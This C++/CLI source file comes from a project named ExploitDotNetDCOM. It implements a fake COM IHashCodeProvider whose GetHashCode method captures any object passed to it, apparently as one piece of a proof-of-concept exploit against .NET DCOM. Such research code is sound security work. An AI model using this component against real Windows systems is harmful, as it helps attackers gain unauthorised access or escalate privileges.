// ExploitDotNetDCOM is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.

// ExploitDotNetDCOM is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.

// You should have received a copy of the GNU General Public License
// along with ExploitDotNetDCOM.  If not, see <http://www.gnu.org/licenses/>.

#include "stdafx.h"
#include "FakeHashCodeProvider.h"
#include "COMSupport.h"
#include <vcclr.h>

using namespace mscorlib;

HRESULT STDMETHODCALLTYPE FakeHashCodeProvider::QueryInterface(
	/* [in] */ REFIID riid,
	/* [iid_is][out] */ _COM_Outptr_ void __RPC_FAR *__RPC_FAR *ppvObject)
{
	IUnknown* pRet = nullptr;

	if (ppvObject == nullptr)
	{
		return E_POINTER;
	}

	*ppvObject = nullptr;

	if (IsEqualIID(riid, IID_IUnknown))
	{
		Console::WriteLine("Queried for IUnknown");

		pRet = static_cast<IHashCodeProvider*>(this);
	}
	else if (IsEqualIID(riid, __uuidof(IHashCodeProvider)))
	{
		Console::WriteLine("Queried for IHashCodeProvider");

		pRet = static_cast<IHashCodeProvider*>(this);
	}
	else if (IsEqualIID(riid, IID_IDispatch))
	{
		Console::WriteLine("Queried for IDispatch");

		pRet = static_cast<IHashCodeProvider*>(this);
	}
	else
	{
		LPOLESTR lpIID;
		StringFromIID(riid, &lpIID);

		Console::WriteLine("Unknown IID {0}", gcnew System::String(lpIID));
		CoTaskMemFree(lpIID);
	}

	if (pRet)
	{
		pRet->AddRef();
		*ppvObject = pRet;
		return S_OK;
	}
	else
	{
		return E_NOINTERFACE;
	}
}

ULONG STDMETHODCALLTYPE FakeHashCodeProvider::AddRef(void)
{
	ULONG ret = InterlockedIncrement(&_refcount);

	Console::WriteLine("AddRef: {0}", ret);

	return ret;
}

ULONG STDMETHODCALLTYPE FakeHashCodeProvider::Release(void)
{
	ULONG ret = InterlockedDecrement(&_refcount);

	Console::WriteLine("Release: {0}", ret);

	if (ret == 0)
	{
		delete this;
	}

	return ret;
}

HRESULT STDMETHODCALLTYPE FakeHashCodeProvider::GetTypeInfoCount(
	/* [out] */ __RPC__out UINT *pctinfo)
{
	return E_FAIL;
}

HRESULT STDMETHODCALLTYPE FakeHashCodeProvider::GetTypeInfo(
	/* [in] */ UINT iTInfo,
	/* [in] */ LCID lcid,
	/* [out] */ __RPC__deref_out_opt ITypeInfo **ppTInfo)
{
	if (ppTInfo)
	{
		*ppTInfo = nullptr;
	}

	return E_FAIL;
}

HRESULT STDMETHODCALLTYPE FakeHashCodeProvider::GetIDsOfNames(
	/* [in] */ __RPC__in REFIID riid,
	/* [size_is][in] */ __RPC__in_ecount_full(cNames) LPOLESTR *rgszNames,
	/* [range][in] */ __RPC__in_range(0, 16384) UINT cNames,
	/* [in] */ LCID lcid,
	/* [size_is][out] */ __RPC__out_ecount_full(cNames) DISPID *rgDispId)
{
	return E_FAIL;
}

HRESULT STDMETHODCALLTYPE FakeHashCodeProvider::Invoke(
	/* [annotation][in] */
	_In_  DISPID dispIdMember,
	/* [annotation][in] */
	_In_  REFIID riid,
	/* [annotation][in] */
	_In_  LCID lcid,
	/* [annotation][in] */
	_In_  WORD wFlags,
	/* [annotation][out][in] */
	_In_  DISPPARAMS *pDispParams,
	/* [annotation][out] */
	_Out_opt_  VARIANT *pVarResult,
	/* [annotation][out] */
	_Out_opt_  EXCEPINFO *pExcepInfo,
	/* [annotation][out] */
	_Out_opt_  UINT *puArgErr)
{
	return E_FAIL;
}

HRESULT __stdcall  FakeHashCodeProvider::raw_GetHashCode(
	/*[in]*/ VARIANT obj,
	/*[out,retval]*/ long * pRetVal)

{
	Console::WriteLine("GetHashCode Called");
	
	if (IsObject(obj))
	{
		captured_object = obj;
		*pRetVal = 0;
	}
	else
	{
		*pRetVal = 1;
	}

	return S_OK;
}